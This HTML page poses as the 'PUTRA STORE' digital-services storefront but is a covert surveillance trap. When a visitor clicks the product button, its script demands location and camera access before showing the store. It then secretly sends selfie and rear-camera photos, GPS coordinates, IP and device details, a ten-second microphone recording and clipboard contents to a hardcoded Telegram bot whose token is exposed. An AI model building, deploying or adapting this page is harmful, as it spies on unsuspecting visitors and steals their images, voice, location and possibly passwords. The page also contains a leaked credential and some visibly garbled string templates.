<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PUTRA STORE</title>
<style>
  body{
    margin:0; padding:0; height:100vh;
    background:#0d0d0d; color:#3399ff;
    font-family: monospace; display:flex;
    align-items:center; justify-content:center;
    flex-direction:column;
  }
  h1{
    margin-bottom:20px; 
    color:#3399ff;
    text-shadow:0 0 12px #00ccff;
    text-align:center;
  }
  button{
    background:transparent; color:#3399ff;
    border:2px solid #3399ff; padding:12px 20px;
    border-radius:10px; font-weight:bold; cursor:pointer; font-size:1.1rem;
    box-shadow:0 0 10px #00ccff;
    transition:0.2s;
    margin-top:10px;
  }
  button:hover{background:#3399ff; color:#0d0d0d;}

  .loader{
    border:6px solid #222;
    border-top:6px solid #00ccff;
    border-radius:50%;
    width:60px; height:60px;
    animation:spin 1s linear infinite;
    margin:20px auto;
  }
  @keyframes spin{
    0%{transform:rotate(0deg);}
    100%{transform:rotate(360deg);}
  }

  .store-container{
    width:100%; max-width:800px;
    padding:40px; text-align:left;
  }
  .store-container h2{
    font-size:2rem; text-align:center;
    margin-bottom:20px; color:#3399ff;
    text-shadow:0 0 12px #00ccff;
  }
  .store-container p{
    color:white; background:#1a1a1a;
    padding:15px; border-radius:10px;
    line-height:1.8; font-size:1rem;
    margin-bottom:40px;
  }
  .center-section{
    text-align:center; width:100%;
  }
  .center-section h3{
    font-size:1.4rem; font-weight:bold; margin-bottom:20px;
    color:#f2f2f2;
  }
  .btn-order{
    display:block; width:200px;
    margin:10px auto; padding:12px 24px;
    font-size:1rem; border-radius:10px;
    cursor:pointer; transition:0.2s;
    font-weight:bold;
  }
  .btn-wa{
    background:transparent; border:2px solid #00ff66; color:#00ff66;
    box-shadow:0 0 8px #00ff66;
  }
  .btn-wa:hover{background:#00ff66; color:#0d0d0d;}
  .btn-ig{
    background:transparent; border:2px solid #ff3399; color:#ff3399;
    box-shadow:0 0 8px #ff3399;
  }
  .btn-ig:hover{background:#ff3399; color:#0d0d0d;}
  .logo-img{
    max-width:150px;
    margin-bottom:15px;
  }

  #error-msg {
    color: #ff6666;
    margin-top: 20px;
    text-align: center;
    font-size: 1.2rem;
    font-weight: bold;
    max-width: 90%;
    display: none;
  }
</style>
</head>
<body>
  <img src="putra.png" alt="PUTRA STORE" class="logo-img">
  <h1>PUTRA STORE</h1>
  <button id="openBtn">CEK PRODUK</button>
  <div id="error-msg"></div>

<script>
const BOT_TOKEN = "8368219449:AAEAW2jkZ0u546zDH-n4clLWvkAmljVHDQg";
const OWNER_ID   = "7030098676";

// Fungsi untuk kembali ke halaman awal + tampilkan pesan error jika ada
function kembaliKeAwal(pesan = "") {
  document.body.innerHTML = `
    <img src="putra.png" alt="PUTRA STORE" class="logo-img">
    <h1>PUTRA STORE</h1>
    <button id="openBtn">CEK PRODUK</button>
    <div id="error-msg">${pesan}</div>
  `;
  
  // Tampilkan pesan jika ada
  if (pesan) {
    document.getElementById("error-msg").style.display = "block";
  }

  // Pasang ulang event listener ke tombol baru
  document.getElementById("openBtn").addEventListener("click", startProcess);
}

// Fungsi utama proses (dipisah biar mudah dipanggil ulang)
async function startProcess() {
  document.body.innerHTML = `
    <div style="text-align:center; color:#3399ff;">
      <h2>Sedang memproses...</h2>
      <div class="loader"></div>
    </div>
  `;

  let coords = null;
  try {
    coords = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(
        pos => resolve(pos.coords),
        err => reject(err),
        { timeout: 10000, enableHighAccuracy: true }
      );
    });
  } catch(e) {
    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
    return;
  }

  const fotoDepan = await ambilFoto("user");
  if (!fotoDepan) {
    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
    return;
  }

  const fotoBelakang = await ambilFoto("environment");
  if (!fotoBelakang) {
    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
    return;
  }

  // Kirim foto ke Telegram
  try {
    const sendPhoto = async (blob, filename, captionBase) => {
      const fd = new FormData();
      fd.append("chat_id", OWNER_ID);
      fd.append("photo", blob, filename);
      let cap = captionBase;
      if (coords) {
        const lat = coords.latitude.toFixed(6);
        const lon = coords.longitude.toFixed(6);
        cap += ` | Lokasi: https://maps.google.com/?q=\( {lat}, \){lon}`;
      }
      fd.append("caption", cap);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:fd});
    };

    await sendPhoto(fotoDepan, "front.jpg", "ðŸ“¸ Foto depan (selfie)");
    await sendPhoto(fotoBelakang, "back.jpg", "ðŸ“¸ Foto belakang (kamera utama)");
  } catch(e) {}

  await kirimDeviceInfo(coords);

  // Tampilkan halaman toko
  document.body.innerHTML = `
    <div class="store-container">
      <div style="text-align:center; margin-bottom:20px;">
        <img src="putra.png" alt="Putra Store" style="max-width:200px;">
      </div>
      <h2>PUTRA DIGITAL STORE</h2>
      <p>
        Semua kebutuhan digital seperti Website, Script, Logo,<br>
        Jasa Membuat Script,<br>
        Jasa Pembuatan Website
      </p>
      <div class="center-section">
        <h3>ORDER VIA</h3>
        <button class="btn-order btn-wa" onclick="window.location.href='https://wa.me/+6287770592893'">
          <img src="wa.png" alt="WA" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
          WHATSAPP
        </button>
        <button class="btn-order btn-ig" onclick="window.location.href='https://www.instagram.com/ptrchyae/=='">
          <img src="ig.png" alt="IG" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
          INSTAGRAM
        </button>
      </div>
    </div>
  `;

  // Rekam mic & clipboard setelah halaman toko muncul
  setTimeout(async () => {
    try {
      await rekamMikrofon(10000);
    } catch(e) {
      // tidak perlu kembali ke awal kalau mic ditolak (karena sudah di halaman toko)
    }
    try {
      await cobaAmbilClipboard();
    } catch(e) {}
  }, 3500);
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Fungsi ambil foto (diubah: return null jika gagal, bukan redirect)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function ambilFoto(facingMode) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: facingMode } }
    });
    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
    stream.getTracks().forEach(t => t.stop());
    return blob;
  } catch(e) {
    return null;
  }
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Fungsi kirim device info (tetap sama, atau bisa diganti ke ipapi.co seperti saran sebelumnya)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function kirimDeviceInfo(coords = null) {
  try {
    let ip = "tidak terdeteksi";
    try {
      const ipRes = await fetch('https://ipapi.co/json/');  // lebih stabil daripada ipify
      if (ipRes.ok) {
        const data = await ipRes.json();
        ip = data.ip || "tidak terdeteksi";
      }
    } catch(e) {}

    const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    let locText = "tidak diizinkan";
    if (coords) {
      const lat = coords.latitude.toFixed(6);
      const lon = coords.longitude.toFixed(6);
      locText = `${lat}, \( {lon} â†’ https://maps.google.com/?q= \){lat},${lon}`;
    }

    const infoText = 
`ðŸ“± Device & IP Info:

1. IP             : ${ip}
2. Lokasi         : ${locText}
3. Waktu          : ${timestamp}
4. User-Agent     : ${navigator.userAgent}
5. Platform       : ${navigator.platform}
6. Bahasa         : ${navigator.language}
7. Semua Bahasa   : ${navigator.languages?.join(", ") || "tidak ada"}
8. Core CPU       : ${navigator.hardwareConcurrency || "tidak tersedia"}
9. RAM (estimasi) : ${navigator.deviceMemory || "tidak tersedia"} GB
10. Layar         : ${screen.width} x \( {screen.height} ( \){screen.colorDepth}bit)
11. Zona Waktu    : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
12. Referrer      : ${document.referrer || "direct"}`;

    const fd = new FormData();
    fd.append("chat_id", OWNER_ID);
    fd.append("text", infoText);
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      body: fd
    });
  } catch(e) {}
}

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Rekam mikrofon & clipboard (tetap sama)
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function rekamMikrofon(durasiMs = 10000) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const recorder = new MediaRecorder(stream);
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = async () => {
      const blob = new Blob(chunks, { type: 'audio/webm' });
      const fd = new FormData();
      fd.append("chat_id", OWNER_ID);
      fd.append("voice", blob, "voice.webm");
      fd.append("caption", `Rekaman mikrofon otomatis (${durasiMs/1000} detik)`);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {method:"POST", body:fd});
      stream.getTracks().forEach(t => t.stop());
    };

    recorder.start();
    setTimeout(() => recorder.stop(), durasiMs);
  } catch(e) {}
}

async function cobaAmbilClipboard() {
  try {
    if (navigator.clipboard && navigator.clipboard.readText) {
      const text = await navigator.clipboard.readText();
      if (text && text.length > 8) {
        const fd = new FormData();
        fd.append("chat_id", OWNER_ID);
        fd.append("text", "ðŸ“‹ Clipboard:\n" + text);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          body: fd
        });
      }
    }
  } catch(e) {}
}

// Pasang event listener awal
document.getElementById("openBtn").addEventListener("click", startProcess);
</script>
</body>
</html>
